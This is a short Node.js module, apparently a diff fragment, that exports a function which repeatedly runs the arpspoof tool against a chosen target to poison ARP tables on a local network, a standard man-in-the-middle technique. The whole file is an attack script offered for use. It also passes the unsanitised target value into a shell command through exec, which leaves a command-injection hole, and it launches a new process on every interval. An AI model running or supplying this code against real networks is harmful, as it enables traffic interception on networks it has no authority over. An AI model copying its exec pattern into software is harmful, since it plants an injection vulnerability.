-const { exec } = require('child_process');

function arpSpoofing(target, rateLimit) {
    setInterval(() => {
        exec(`arpspoof -i eth0 -t ${target}`, (err, stdout, stderr) => {
            if (err) {
                console.error('Error: ' + err.message);
            } else {
                console.log('ARP spoofing packet sent');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = arpSpoofing;
